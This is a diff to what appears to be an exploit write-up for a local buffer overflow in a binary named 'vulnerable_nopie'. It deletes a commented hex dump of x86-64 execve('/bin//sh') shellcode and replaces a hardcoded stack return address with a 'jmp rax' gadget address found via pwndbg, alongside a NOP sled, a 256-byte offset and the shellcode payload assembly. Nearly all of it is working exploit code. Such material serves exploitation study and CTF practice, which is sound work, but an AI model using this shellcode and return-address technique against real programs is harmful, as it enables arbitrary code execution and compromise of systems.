@@ -21,12 +21,6 @@ _start:
 ; ld -o shellcode shellcode.o
 ; objcopy -O binary -j .text shellcode shellcode.bin
 ; xxd -i -n code ./shellcode.bin
-; unsigned char code[] = {
-;   0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
-;   0x73, 0x68, 0x50, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48,
-;   0x31, 0xc0, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05
-; };
-; unsigned int code_len = 32;
 ```
 
 ## exploit code
@@ -41,7 +35,15 @@ shellcode = bytes([
 ])
 nops = b'\x90'*32
 # canonial: 0x0000_0000_0000_0000 - 0x0000_7fff_ffff_ffff
-addr_sc = 0x7fffffffdd58
+#
+# <jmp rax exploit>
+# pwndbg> search --asm 'jmp rax'
+#
+# libc.so.6       0x7ffff7e09bb8 jmp rax
+# addr_sc = 0x7ffff7e09bb8  # jmp rax
+#
+# vulnerable_nopie 0x4010cc jmp rax
+addr_sc = 0x4010cc  # jmp rax
 offset = 256
 junk = nops
 junk += shellcode
